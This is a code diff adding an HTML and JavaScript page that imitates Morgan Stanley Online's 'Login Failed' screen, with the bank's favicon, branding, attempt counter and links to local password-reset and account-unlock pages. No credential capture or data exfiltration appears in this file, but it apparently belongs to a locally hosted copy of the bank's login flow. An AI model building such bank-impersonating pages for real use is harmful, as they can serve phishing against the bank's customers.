@@ -1,0 +1,627 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=11">
+    <link rel="icon" type="image/x-icon" href="https://login.morganstanleyclientserv.com/ux/favicon.ico">
+    <meta name="viewport" content="initial-scale=1,maximum-scale=1">
+    <title>Morgan Stanley Online - Login Failed</title>
+    <!-- External CSS file -->
+    <link rel="stylesheet" href="style.css">
+    <!-- Additional styles specific to login failure page -->
+    <style>
+        .error-subtitle {
+            text-align: center;
+            margin-bottom: 30px;
+            font-size: 16px;
+        }
+        
+        /* Error icon and animation */
+        .error-icon {
+            text-align: center;
+            margin: 20px 0 10px;
+        }
+        
+        .error-circle {
+            width: 80px;
+            height: 80px;
+            background: #fee;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            animation: shakeError 0.5s ease-in-out;
+        }
+        
+        .error-circle svg {
+            width: 50px;
+            height: 50px;
+        }
+        
+        @keyframes shakeError {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-8px); }
+            75% { transform: translateX(8px); }
+        }
+        
+        /* Alert box */
+        .alert-box {
+            background-color: #fff5f5;
+            border-left: 4px solid #a00;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 8px;
+        }
+        
+        .alert-title {
+            color: #a00;
+            font-weight: 700;
+            margin-bottom: 8px;
+            font-size: 16px;
+        }
+        
+        .alert-message {
+            color: #666;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+        
+        .alert-message a {
+            color: #187aba;
+            text-decoration: none;
+        }
+        
+        .alert-message a:hover {
+            text-decoration: underline;
+        }
+        
+        /* Attempt counter */
+        .attempt-counter {
+            text-align: center;
+            font-size: 14px;
+            color: #a00;
+            margin: 15px 0;
+            padding: 8px;
+            background: #fff5f5;
+            border-radius: 8px;
+        }
+        
+        .attempt-number {
+            font-weight: 700;
+            font-size: 18px;
+        }
+        
+        /* Lockout warning */
+        .lockout-warning {
+            background-color: #fff8e1;
+            border-left: 4px solid #bb831b;
+            padding: 12px;
+            margin: 15px 0;
+            border-radius: 8px;
+            font-size: 13px;
+            color: #856404;
+        }
+        
+        /* Divider */
+        .divider {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            margin: 25px 0 20px;
+            color: #999;
+            font-size: 12px;
+        }
+        
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #e9e9e9;
+        }
+        
+        .divider::before {
+            margin-right: 10px;
+        }
+        
+        .divider::after {
+            margin-left: 10px;
+        }
+        
+        /* Security tips */
+        .security-tips {
+            background-color: #f5f9fc;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 20px 0;
+        }
+        
+        .security-tips h4 {
+            color: #002b51;
+            font-size: 14px;
+            margin: 0 0 10px 0;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .security-tips ul {
+            margin: 0;
+            padding-left: 20px;
+        }
+        
+        .security-tips li {
+            font-size: 13px;
+            color: #666;
+            margin: 5px 0;
+        }
+        
+        /* Progress indicator (failed state) */
+        .progress-steps {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin: 20px 0 30px;
+        }
+        
+        .step {
+            text-align: center;
+            color: #999;
+            font-size: 12px;
+            position: relative;
+        }
+        
+        .step.active {
+            color: #187aba;
+            font-weight: 700;
+        }
+        
+        .step.failed {
+            color: #a00;
+        }
+        
+        .step-number {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background: #e9e9e9;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 5px;
+            font-weight: 700;
+        }
+        
+        .step.active .step-number {
+            background: #187aba;
+            color: white;
+        }
+        
+        .step.failed .step-number {
+            background: #a00;
+            color: white;
+        }
+        
+        /* Help links grid */
+        .help-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin: 20px 0;
+        }
+        
+        .help-card {
+            background: #f5f5f5;
+            padding: 12px;
+            border-radius: 8px;
+            text-align: center;
+            transition: all 0.2s;
+            cursor: pointer;
+            text-decoration: none;
+            display: block;
+        }
+        
+        .help-card:hover {
+            background: #e9e9e9;
+            transform: translateY(-2px);
+        }
+        
+        .help-card .help-icon {
+            font-size: 24px;
+            margin-bottom: 8px;
+            display: block;
+        }
+        
+        .help-card .help-title {
+            font-weight: 700;
+            color: #187aba;
+            font-size: 14px;
+            margin-bottom: 4px;
+        }
+        
+        .help-card .help-desc {
+            font-size: 12px;
+            color: #666;
+        }
+        
+        /* Return to login button specific */
+        .btn-primary-large {
+            background-color: #187aba;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            width: 100%;
+            font-weight: 700;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 50px;
+            transition: background-color 0.2s;
+        }
+        
+        .btn-primary-large:hover {
+            background-color: #005c90;
+        }
+    </style>
+</head>
+<body>
+    <!-- Skip to main content link -->
+    <a href="#main-content" class="skip-link">Skip to main content</a>
+
+    <!-- Header -->
+    <div role="banner">
+        <div class="mso-header-container">
+            <div>
+                <svg width="200" height="32" viewBox="0 0 200 32" class="mso-desktop-header" aria-label="Morgan Stanley">
+                    <text x="0" y="24" font-family="Karla, Arial, sans-serif" font-weight="700" font-size="24" fill="#002b51">Morgan Stanley</text>
+                </svg>
+            </div>
+            <nav class="mso-header-nav-bar" aria-label="Main navigation">
+                <div class="mso-header-nav-element"><a href="#" class="mso-header-nav-content">Online Security Center</a></div>
+                <div class="mso-header-nav-element"><a href="#" class="mso-header-nav-content">Find an Advisor / Branch</a></div>
+                <div class="mso-header-nav-element"><a href="#" class="mso-header-nav-content">Help + Support</a></div>
+            </nav>
+        </div>
+    </div>
+
+    <!-- Main content -->
+    <main id="main-content" class="login-page">
+        <div class="login_form">
+            <div class="login-row">
+                <!-- Left column: Error message -->
+                <div class="login-left">
+                    <div class="login-container">
+                        <h2>Login Failed</h2>
+                        <div class="error-subtitle">
+                            We couldn't verify your credentials
+                        </div>
+
+                        <!-- Progress indicator -->
+                        <div class="progress-steps">
+                            <div class="step failed">
+                                <div class="step-number">✗</div>
+                                <div>Login</div>
+                            </div>
+                            <div class="step">
+                                <div class="step-number">2</div>
+                                <div>Verify</div>
+                            </div>
+                            <div class="step">
+                                <div class="step-number">3</div>
+                                <div>Account</div>
+                            </div>
+                        </div>
+
+                        <!-- Error icon -->
+                        <div class="error-icon">
+                            <div class="error-circle">
+                                <svg viewBox="0 0 24 24" fill="none" stroke="#a00" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                    <circle cx="12" cy="12" r="10"></circle>
+                                    <line x1="12" y1="8" x2="12" y2="12"></line>
+                                    <line x1="12" y1="16" x2="12.01" y2="16"></line>
+                                </svg>
+                            </div>
+                        </div>
+
+                        <!-- Alert box -->
+                        <div class="alert-box">
+                            <div class="alert-title">Invalid username or password</div>
+                            <div class="alert-message">
+                                The username or password you entered is incorrect. Please try again or 
+                                <a href="#" onclick="resetPassword()">reset your password</a>.
+                            </div>
+                        </div>
+
+                        <!-- Attempt counter (dynamic) -->
+                        <div id="attemptCounter" class="attempt-counter" style="display: none;">
+                            <span class="attempt-number" id="attemptCount">3</span> failed attempt(s) remaining
+                        </div>
+
+                        <!-- Lockout warning (shown after multiple failures) -->
+                        <div id="lockoutWarning" class="lockout-warning" style="display: none;">
+                            ⚠️ Multiple failed attempts detected. After 5 failed attempts, your account will be temporarily locked for 15 minutes.
+                        </div>
+
+                        <!-- Return to login button -->
+                        <div class="form-row text-center">
+                            <button type="button" class="btn-primary-large" onclick="retryLogin()">
+                                Try again
+                            </button>
+                        </div>
+
+                        <div class="divider">or</div>
+
+                        <!-- Help options -->
+                        <div class="help-grid">
+                            <a href="#" class="help-card" onclick="resetPassword(); return false;">
+                                <span class="help-icon">🔑</span>
+                                <div class="help-title">Forgot password?</div>
+                                <div class="help-desc">Reset your password online</div>
+                            </a>
+                            <a href="#" class="help-card" onclick="forgotUsername(); return false;">
+                                <span class="help-icon">👤</span>
+                                <div class="help-title">Forgot username?</div>
+                                <div class="help-desc">Recover your username</div>
+                            </a>
+                            <a href="#" class="help-card" onclick="unlockAccount(); return false;">
+                                <span class="help-icon">🔓</span>
+                                <div class="help-title">Unlock account</div>
+                                <div class="help-desc">Account locked? Unlock here</div>
+                            </a>
+                            <a href="#" class="help-card" onclick="contactSupport(); return false;">
+                                <span class="help-icon">📞</span>
+                                <div class="help-title">Contact support</div>
+                                <div class="help-desc">24/7 customer service</div>
+                            </a>
+                        </div>
+
+                        <!-- Security tips -->
+                        <div class="security-tips">
+                            <h4>
+                                <span>🔒</span> Security tips
+                            </h4>
+                            <ul>
+                                <li>Passwords are case-sensitive</li>
+                                <li>Caps Lock may be on - check your keyboard</li>
+                                <li>Make sure you're using the correct username (not email)</li>
+                                <li>Clear browser cache if you recently changed your password</li>
+                            </ul>
+                        </div>
+
+                        <!-- Additional help link -->
+                        <div class="text-center" style="margin-top: 15px;">
+                            <a href="#" style="color: #187aba; text-decoration: none; font-size: 14px;" onclick="showMoreHelp(); return false;">
+                                Need more help? →
+                            </a>
+                        </div>
+
+                        <!-- Session info (hidden) -->
+                        <div id="sessionInfo" class="session-info hidden"></div>
+                    </div>
+                </div>
+
+                <!-- Right column: Banner -->
+                <div class="login-right">
+                    <div class="banner">
+                        <div class="banner-content">
+                            <h3>Having Trouble?<br>We're Here to Help.</h3>
+                            <p>Contact our support team 24/7 for assistance with your account</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <footer class="ms-footer">
+            <div class="footer-content">
+                <div class="footer-columns">
+                    <div class="footer-column">
+                        <h4>Need Help?</h4>
+                        <div class="footer-links">
+                            <a href="#">Help + Support</a>
+                            <a href="#" class="mobile-only">Find an Advisor/Branch</a>
+                            <a href="#">Tutorial Videos</a>
+                            <a href="#" class="desktop-only">Co-Browse</a>
+                            <a href="#" class="mobile-only">Mobile Privacy Notice</a>
+                        </div>
+                    </div>
+                    <div class="footer-column footer-column-large">
+                        <h4>Legal</h4>
+                        <div class="footer-links">
+                            <a href="#">Online Security</a>
+                            <a href="#">Terms of Use</a>
+                            <a href="#">U.S. Patriot Act</a>
+                            <a href="#">Morgan Stanley Smith Barney LLC Financial Statement</a>
+                            <a href="#">Morgan Stanley & Co. LLC Financial Statement</a>
+                            <a href="#">Research Disclosures</a>
+                            <a href="#">FINRA Rule 4340</a>
+                            <a href="#">Rate Monitor</a>
+                            <a href="#">Morgan Stanley Smith Barney LLC Business Continuity Information</a>
+                            <a href="#">Investor Resources</a>
+                        </div>
+                    </div>
+                    <div class="footer-column desktop-only">
+                        <h4>Privacy</h4>
+                        <div class="footer-links">
+                            <a href="#">US Privacy Policy</a>
+                        </div>
+                    </div>
+                </div>
+                <div class="footer-copyright">
+                    © Morgan Stanley Smith Barney LLC, Member <a href="#">SIPC</a>. All rights reserved.
+                </div>
+            </div>
+        </footer>
+    </main>
+
+<script>
+    // Get attempt count from URL or sessionStorage
+    const urlParams = new URLSearchParams(window.location.search);
+    let attemptCount = parseInt(urlParams.get('attempts')) || parseInt(sessionStorage.getItem('loginAttempts')) || 1;
+    let remainingAttempts = 5 - attemptCount;
+    
+    // Get session ID if available
+    let sessionId = urlParams.get('sessionId') || sessionStorage.getItem('loginSessionId');
+    
+    if (sessionId) {
+        sessionStorage.setItem('failedSessionId', sessionId);
+        const sessionInfo = document.getElementById('sessionInfo');
+        if (sessionInfo) {
+            sessionInfo.textContent = `Session: ${sessionId.substring(0,8)}...`;
+            sessionInfo.classList.remove('hidden');
+        }
+    }
+    
+    // Update attempt counter display
+    function updateAttemptDisplay() {
+        const attemptCounter = document.getElementById('attemptCounter');
+        const lockoutWarning = document.getElementById('lockoutWarning');
+        const attemptCountSpan = document.getElementById('attemptCount');
+        
+        if (remainingAttempts > 0 && remainingAttempts <= 5) {
+            attemptCounter.style.display = 'block';
+            attemptCountSpan.textContent = remainingAttempts;
+            
+            // Show warning when attempts are low
+            if (remainingAttempts <= 2) {
+                const warningMsg = document.querySelector('.attempt-counter');
+                if (warningMsg) {
+                    warningMsg.style.backgroundColor = '#fff0f0';
+                    warningMsg.style.border = '1px solid #a00';
+                }
+            }
+            
+            // Show lockout warning after 2 attempts
+            if (remainingAttempts <= 3) {
+                lockoutWarning.style.display = 'block';
+            }
+        } else if (remainingAttempts <= 0) {
+            // Account locked
+            attemptCounter.style.display = 'block';
+            attemptCountSpan.textContent = '0';
+            lockoutWarning.style.display = 'block';
+            lockoutWarning.innerHTML = '🔒 Your account has been temporarily locked due to multiple failed attempts. Please try again in 15 minutes or <a href="#" style="color: #bb831b;" onclick="unlockAccount(); return false;">click here to unlock now</a>.';
+            lockoutWarning.style.backgroundColor = '#fff3e0';
+        }
+    }
+    
+    // Retry login - go back to login page with attempt count
+    function retryLogin() {
+        // Increment attempt counter
+        const newAttemptCount = attemptCount + 1;
+        sessionStorage.setItem('loginAttempts', newAttemptCount);
+        
+        // Redirect back to login page with attempt tracking
+        window.location.href = `index.html?attempts=${newAttemptCount}&retry=true`;
+    }
+    
+    // Reset password flow
+    function resetPassword() {
+        if (confirm("You will be redirected to reset your password. A verification code will be sent to your registered email. Continue?")) {
+            sessionStorage.setItem('resetPasswordInitiated', 'true');
+            window.location.href = 'forgot-password.html';
+        }
+    }
+    
+    // Forgot username flow
+    function forgotUsername() {
+        if (confirm("We'll help you recover your username. A verification code will be sent to your registered email. Continue?")) {
+            sessionStorage.setItem('forgotUsernameInitiated', 'true');
+            window.location.href = 'forgot-username.html';
+        }
+    }
+    
+    // Unlock account flow
+    function unlockAccount() {
+        if (confirm("Your account can be unlocked via email verification. A one-time code will be sent to your registered email. Continue?")) {
+            sessionStorage.setItem('unlockAccountInitiated', 'true');
+            window.location.href = 'unlock-account.html';
+        }
+    }
+    
+    // Contact support
+    function contactSupport() {
+        window.location.href = 'tel:18884547626';
+        // Alternative: show modal with support info
+        alert("Morgan Stanley Client Support\n\nPhone: 1-888-454-7626\nHours: 24/7\n\nOnline: https://morganstanley.com/support");
+    }
+    
+    // Show more help options
+    function showMoreHelp() {
+        const helpSection = document.querySelector('.help-grid');
+        if (helpSection) {
+            helpSection.scrollIntoView({ behavior: 'smooth', block: 'center' });
+            
+            // Flash the help section
+            helpSection.style.transition = 'background-color 0.3s';
+            helpSection.style.backgroundColor = '#f0f7ff';
+            setTimeout(() => {
+                helpSection.style.backgroundColor = '';
+            }, 1000);
+        }
+    }
+    
+    // Track this failed attempt in localStorage for demo
+    function trackFailedAttempt() {
+        const failedAttempts = JSON.parse(localStorage.getItem('failedLoginAttempts') || '[]');
+        const timestamp = new Date().toISOString();
+        const userAgent = navigator.userAgent;
+        
+        failedAttempts.push({
+            timestamp: timestamp,
+            attempts: attemptCount,
+            userAgent: userAgent.substring(0, 100),
+            sessionId: sessionId
+        });
+        
+        // Keep only last 10 attempts
+        while (failedAttempts.length > 10) {
+            failedAttempts.shift();
+        }
+        
+        localStorage.setItem('failedLoginAttempts', JSON.stringify(failedAttempts));
+        
+        // Log for debugging (remove in production)
+        console.log(`Failed login attempt #${attemptCount} recorded at ${timestamp}`);
+    }
+    
+    // Add keyboard navigation (Enter key retries)
+    document.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') {
+            retryLogin();
+        }
+    });
+    
+    // Add some analytics for demo
+    function logPageView() {
+        console.log(`Failed login page viewed - Attempt #${attemptCount} - ${new Date().toISOString()}`);
+    }
+    
+    // Initialize page
+    updateAttemptDisplay();
+    trackFailedAttempt();
+    logPageView();
+    
+    // Auto-focus on try again button for accessibility
+    const tryAgainBtn = document.querySelector('.btn-primary-large');
+    if (tryAgainBtn) {
+        setTimeout(() => {
+            tryAgainBtn.focus();
+        }, 100);
+    }
+    
+    // Add shake animation to error icon on load
+    const errorCircle = document.querySelector('.error-circle');
+    if (errorCircle) {
+        errorCircle.style.animation = 'shakeError 0.5s ease-in-out';
+    }
+    
+    // Store the referring page
+    sessionStorage.setItem('lastFailedAttempt', new Date().toISOString());
+    
+    // Clean up on page unload
+    window.addEventListener('beforeunload', function() {
+        // Nothing to clean up
+    });
+</script>
+</body>
+</html>
